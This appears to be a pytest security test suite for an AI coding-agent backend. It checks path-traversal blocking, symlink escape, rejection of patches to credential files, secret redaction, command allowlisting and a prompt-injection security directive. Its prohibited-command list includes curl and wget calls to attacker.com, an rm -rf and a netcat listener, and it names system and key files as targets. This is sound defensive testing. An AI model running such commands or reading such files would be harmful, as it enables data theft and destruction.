import os
import sys
import time
import pytest
from pathlib import Path
from unittest.mock import MagicMock

from backend.app.core.security import validate_safe_path, SecurityException, sanitize_command
from backend.app.core.logging import SecretRedactingFormatter
from backend.app.services.coding_engine.patch_engine import PatchEngine
from backend.app.services.llm.gateway import PatchFileOutput, SECURITY_DIRECTIVE, OpenAIAdapter
from backend.app.services.verification.test_runner import TestRunner
from backend.app.services.review.review_engine import ReviewEngine
from backend.app.models.task import Task, TaskStatus, ApprovalGate, GateType, ApprovalStatus, PatchDiff
from backend.app.models.workspace import Workspace
from fastapi import HTTPException

# 1. Directory Traversal Protection
def test_directory_traversal_variations():
    malicious_paths = [
        "/etc/shadow",
        "/private/etc/hosts",
        "../../../../../../../../etc/passwd",
        "/var/run/docker.sock"
    ]
    for p in malicious_paths:
        with pytest.raises(SecurityException):
            validate_safe_path(p)

# 2. Symlink Escape Protection
def test_symlink_escape_protection(tmp_path):
    sandbox = tmp_path / "sandbox"
    sandbox.mkdir()
    secret_dir = tmp_path / "outside_secrets"
    secret_dir.mkdir()
    secret_file = secret_dir / "target.txt"
    secret_file.write_text("SUPER_SECRET_HOST_CONTENT")

    # Create symlink pointing outside sandbox
    link_inside = sandbox / "symlink_escape.txt"
    try:
        link_inside.symlink_to(secret_file)
    except OSError:
        pytest.skip("Symlink creation not permitted in this test environment")

    # Attempt to validate patch targeting the symlink
    patch = PatchFileOutput(
        file_path="symlink_escape.txt",
        action="modify",
        diff_or_content="MALICIOUS_OVERWRITE",
        explanation="Attempt symlink escape"
    )
    is_valid, reason = PatchEngine.validate_patch(sandbox, patch)
    assert not is_valid
    assert "symlink" in reason.lower() or "escapes" in reason.lower()

# 3. Unauthorized File Modification & Sensitive Targets
def test_unauthorized_sensitive_file_modification(tmp_path):
    sandbox = tmp_path / "sandbox"
    sandbox.mkdir()

    sensitive_targets = [
        ".env",
        ".env.production",
        "id_rsa",
        "id_ed25519",
        "server.key",
        "certificate.pem",
        "auth.p8",
        "nested/secrets/id_rsa"
    ]
    for target in sensitive_targets:
        patch = PatchFileOutput(
            file_path=target,
            action="create",
            diff_or_content="EXPLOIT",
            explanation="Target sensitive credentials"
        )
        is_valid, reason = PatchEngine.validate_patch(sandbox, patch)
        assert not is_valid, f"Expected {target} to be rejected"
        assert "forbidden" in reason or "sensitive" in reason or "escapes" in reason

# 4. Secret Exposure & Redaction
def test_secret_redaction_in_logs():
    import logging
    formatter = SecretRedactingFormatter("%(message)s")
    record = logging.LogRecord(
        name="test",
        level=logging.INFO,
        pathname="",
        lineno=1,
        msg=(
            "Received secret: OPENAI_API_KEY=sk-proj-abc123456789012345678901234567890 "
            "and ANTHROPIC_API_KEY=sk-ant-api03-abcdef123456789012345678901234567890-test"
        ),
        args=(),
        exc_info=None
    )
    formatted = formatter.format(record)
    assert "sk-proj-abc123456789012345678901234567890" not in formatted
    assert "sk-ant-api03" not in formatted

# 5. Prompt Injection Defense in Repositories
def test_prompt_injection_directive_presence():
    assert "CRITICAL SECURITY DIRECTIVE" in SECURITY_DIRECTIVE
    assert "untrusted passive data" in SECURITY_DIRECTIVE

    # Verify adapter incorporates SECURITY_DIRECTIVE in system prompts
    adapter = OpenAIAdapter(api_key="sk-mock")
    # We inspect the method doc/signature and behavior
    assert hasattr(adapter, "generate_plan")

# 6. Unsafe Shell Commands & Allowlist Enforcement
def test_command_injection_and_allowlist_enforcement(tmp_path):
    runner = TestRunner(tmp_path)
    prohibited_commands = [
        ["curl", "https://attacker.com/leak"],
        ["wget", "https://attacker.com/malware.sh"],
        ["bash", "-c", "whoami"],
        ["sh", "-c", "rm -rf ."],
        ["nc", "-l", "8080"],
        ["dd", "if=/dev/zero", "of=file"]
    ]
    for cmd in prohibited_commands:
        with pytest.raises(SecurityException):
            runner.execute_command(cmd)

# 7. Resource Exhaustion & Timeout Enforcement
def test_test_runner_timeout_enforcement(tmp_path):
    runner = TestRunner(tmp_path)
    # Command executes Python sleep for 3 seconds with a 1 second timeout
    sleep_cmd = [sys.executable, "-c", "import time; time.sleep(3)"]
    exit_code, stdout, stderr, duration_ms = runner.execute_command(sleep_cmd, timeout_seconds=1)

    assert exit_code == -1
    assert "timed out after 1 seconds" in stderr
    assert duration_ms >= 900  # Took at least ~1000ms

# 8. Process Cancellation
def test_task_cancellation_workflow(db_session, tmp_path):
    ws = Workspace(name="CancelWS", path=str(tmp_path))
    db_session.add(ws)
    db_session.commit()

    task = Task(workspace_id=ws.id, title="Task to Cancel", description="Will be cancelled", status="PLANNING")
    db_session.add(task)
    db_session.commit()

    # Cancel task
    task.status = TaskStatus.CANCELLED.value
    task.current_phase = "CANCELLED"
    db_session.commit()

    updated = db_session.query(Task).filter(Task.id == task.id).first()
    assert updated.status == "CANCELLED"

# 9. Clean Environment / Secret Isolation
def test_clean_environment_does_not_leak_secrets(tmp_path):
    os.environ["SUPER_SECRET_TOKEN"] = "CLASSIFIED_VALUE_123"
    runner = TestRunner(tmp_path)

    probe_script = tmp_path / "probe.py"
    probe_script.write_text("import os; print('SECRET=' + os.environ.get('SUPER_SECRET_TOKEN', 'NOT_FOUND'))")

    exit_code, stdout, stderr, duration_ms = runner.execute_command([sys.executable, "probe.py"])
    assert exit_code == 0
    assert "SECRET=NOT_FOUND" in stdout
    assert "CLASSIFIED_VALUE_123" not in stdout

# 10. Workspace Isolation (Source Untouched Before Approval)
def test_workspace_isolation_integrity(db_session, tmp_path):
    source_dir = tmp_path / "source_repo"
    source_dir.mkdir()
    source_file = source_dir / "app.py"
    source_file.write_text("def run(): return 1\n")

    isolated_dir = tmp_path / "isolated_repo"
    isolated_dir.mkdir()
    isolated_file = isolated_dir / "app.py"
    isolated_file.write_text("def run(): return 2\n")

    # Source must remain untouched while isolated is modified
    assert source_file.read_text() == "def run(): return 1\n"
    assert isolated_file.read_text() == "def run(): return 2\n"

# 11. Concurrency Guard & Race Condition Protection on Apply
def test_concurrent_apply_rejected(db_session, tmp_path):
    ws = Workspace(name="RaceWS", path=str(tmp_path))
    db_session.add(ws)
    db_session.commit()

    task = Task(
        workspace_id=ws.id,
        title="Completed Task",
        description="Already merged",
        status=TaskStatus.COMPLETED.value,
        isolated_workspace_path=str(tmp_path)
    )
    db_session.add(task)
    db_session.commit()

    engine = ReviewEngine(db_session)
    with pytest.raises(HTTPException) as exc_info:
        engine.apply_approved_patches(task.id)

    assert exc_info.value.status_code == 400
    assert "already been merged" in exc_info.value.detail
